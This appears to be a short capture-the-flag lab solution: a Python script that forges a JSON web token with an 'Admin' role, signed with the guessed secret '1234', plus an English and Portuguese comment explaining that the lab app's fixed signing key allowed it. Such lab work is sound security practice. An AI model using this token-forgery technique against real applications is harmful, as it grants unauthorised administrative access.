import jwt
from datetime import datetime,timedelta

payload = {
    "userId": 2,
    "email": "user",
    "role": "Admin", 
    "iss": "bookshelf",
    "iat": int(datetime.now().timestamp()),
    "exp": int((datetime.now() + timedelta(days=7)).timestamp())
}
token = jwt.encode(payload, "1234", algorithm="HS256")
print(token)


"""
    In this lab, i had a book hosting web application (java, and give source code), which had a admin book with the flag.
    The authentication process is based on JSON web token. But the vulnerabilitie is that the cript algorithm use always the same salt.
    So what i did was to encode the payload (intercepted and decoded by burpsuite) using admin credentials (using application logic used in users).
"""

"""
    Neste laboratório, eu tinha um aplicativo web de hospedagem de livros (java e código-fonte fornecido), que tinha um livro de administração com o sinalizador.
    O processo de autenticação é baseado no token web JSON. Mas a vulnerabilidade é que o algoritmo crypt usa sempre o mesmo sal.
    Então o que eu fiz foi codificar a carga útil (interceptada e decodificada pelo burpsuite) usando credenciais de administrador (usando lógica de aplicativo usada em usuários)
"""


